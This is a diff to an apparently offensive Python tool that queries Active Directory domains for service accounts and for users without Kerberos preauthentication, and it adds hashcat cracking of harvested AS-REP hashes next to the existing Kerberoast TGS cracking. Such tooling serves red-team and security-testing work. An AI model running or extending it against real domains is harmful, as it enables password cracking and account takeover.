@@ -666,7 +666,7 @@ if __name__ == "__main__":
 
     #required args: db file, creds, target-domain file, outputfile
 
-    parser = argparse.ArgumentParser(add_help =  True, description = "Continously query domains for SPNs that are running. Monitor for changes and pull latest TGS tickets")
+    parser = argparse.ArgumentParser(add_help =  True, description = "Query domains for SPNs that are configured and for users that have the property 'Do not require Kerberos preauthentication' set (UF_DONT_REQUIRE_PREAUTH). Monitor for changes and pull latest TGT or TGS tickets.")
     parser.add_argument('-credentials', action='store', help='domain/username[:password]')
     parser.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                                                    '(KRB5CCNAME) based on target parameters. If valid credentials '
@@ -789,14 +789,17 @@ if __name__ == "__main__":
 
         if options.crack is not None:
             if os.path.exists(options.outputfile+".23.krb5tgs"):
-                logger.info("Starting to crack RC4 tickets using wordlist: "+options.crack)
+                logger.info("[KERBEROAST] Starting to crack RC4 TGS tickets using wordlist: "+options.crack)
                 subprocess.run(["hashcat","-m13100","-a0",options.outputfile+".23.krb5tgs",options.crack,"--force"]).stdout
             if os.path.exists(options.outputfile+".17.krb5tgs"):
-                logger.info("Starting to crack AES128 encrypted tickets using wordlist: "+options.crack)
+                logger.info("[KERBEROAST] Starting to crack AES128 encrypted TGS tickets using wordlist: "+options.crack)
                 subprocess.run(["hashcat","-m19600","-a0",options.outputfile+".17.krb5tgs",options.crack,"--force"]).stdout
             if os.path.exists(options.outputfile+".18.krb5tgs"):
-                logger.info("Starting to crack AES256 encrypted tickets using wordlist: "+options.crack)
+                logger.info("[KERBEROAST] Starting to crack AES256 encrypted TGS tickets using wordlist: "+options.crack)
                 subprocess.run(["hashcat","-m19700","-a0",options.outputfile+".18.krb5tgs",options.crack,"--force"]).stdout
+            if os.path.exists(options.outputfile+".23.krb5asrep"):
+                logger.info("[ASREP-ROAST] Starting to crack RC4 encrypted TGT tickets using wordlist: "+options.crack)
+                subprocess.run(["hashcat","-m18200","-a0",options.outputfile+".23.krb5asrep",options.crack,"--force"]).stdout
 
     except Exception as e:
         import traceback
